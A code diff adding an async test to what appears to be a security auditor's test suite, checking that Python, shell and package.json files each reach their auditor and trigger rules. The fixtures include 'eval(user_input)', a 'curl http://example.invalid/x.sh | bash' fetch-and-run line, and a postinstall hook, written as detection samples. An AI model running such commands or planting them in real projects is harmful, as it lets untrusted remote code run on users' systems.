@@ -97,3 +97,35 @@ async def test_parallel_writers(tmp_path):
     assert all(isinstance(n, int) for n in results)
     async with await IndexStore.connect(db) as index:
         assert len(await index.files()) == 2
+
+
+async def test_scan_dispatches_each_language(tmp_path):
+    """Discovery + dispatch route every language through the engine: a `.py` (by suffix), a `.sh`
+    (by suffix), and a `package.json` (by filename) each reach their auditor and surface their
+    representative rule. Also exercises the engine's rule-id pre-filter for shell/manifest."""
+    root = tmp_path
+    (root / "pyproject.toml").write_text(
+        '[project]\nname = "x"\nversion = "0"\n[tool.auditor]\nextends = "base"\n'
+    )
+    (root / ".auditor").mkdir()
+    src = root / "src"
+    src.mkdir()
+    (src / "a.py").write_text("eval(user_input)\n")
+    (src / "deploy.sh").write_text("curl http://example.invalid/x.sh | bash\n")
+    (src / "package.json").write_text('{"scripts": {"postinstall": "node x.js"}}\n')
+
+    settings = load_config(root)
+    async with await IndexStore.connect(root / ".auditor" / "index.db") as index:
+        results = await _scan_dir(root, src, settings, index)
+
+    langs = {f: r.language for f, r in results.items()}
+    assert langs == {
+        "src/a.py": "python",
+        "src/deploy.sh": "shell",
+        "src/package.json": "manifest",
+    }
+    assert "PY-SEC-DANGEROUS-EVAL" in {f.rule_id for f in results["src/a.py"].findings}
+    assert "SH-MAL-CURL-BASH" in {f.rule_id for f in results["src/deploy.sh"].findings}
+    assert "MF-SUPPLY-INSTALL-HOOK" in {
+        f.rule_id for f in results["src/package.json"].findings
+    }
